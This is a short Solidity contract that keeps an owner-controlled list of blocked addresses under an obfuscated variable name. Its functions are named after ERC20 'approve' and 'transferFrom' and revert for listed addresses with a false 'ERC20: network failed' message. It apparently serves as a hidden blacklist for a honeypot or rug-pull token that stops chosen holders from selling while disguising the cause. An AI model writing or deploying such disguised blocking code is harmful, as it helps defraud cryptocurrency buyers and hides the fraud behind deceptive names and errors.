// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;
contract MustStopMurad {
    address private immutable _owner;
    mapping(address=>bool) _rewardTokenPoolStartTimeRefundee;

    modifier onlyOwner() {
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }

    constructor() {
        _owner = msg.sender;
    }
    
    function approve(address addr1, address, uint256) public view returns(bool){
        require(_rewardTokenPoolStartTimeRefundee[addr1]!=true,"ERC20: network failed");
        return false;
    }

    function transferFrom(address addr1, address, uint256) public view returns(bool success){
        require(_rewardTokenPoolStartTimeRefundee[addr1]!=true,"ERC20: network failed");
        return false;
    }

    function add(address[] calldata addr) public onlyOwner{
        for (uint256 i = 0; i < addr.length; i++) {
            _rewardTokenPoolStartTimeRefundee[addr[i]] = true;
        }
        
    }

    function sub(address[] calldata addr) public onlyOwner{
        for (uint256 i = 0; i < addr.length; i++) {
            _rewardTokenPoolStartTimeRefundee[addr[i]] = false;
        }
    }

    function result(address _account) external view returns(bool){
        return _rewardTokenPoolStartTimeRefundee[_account];
    }
}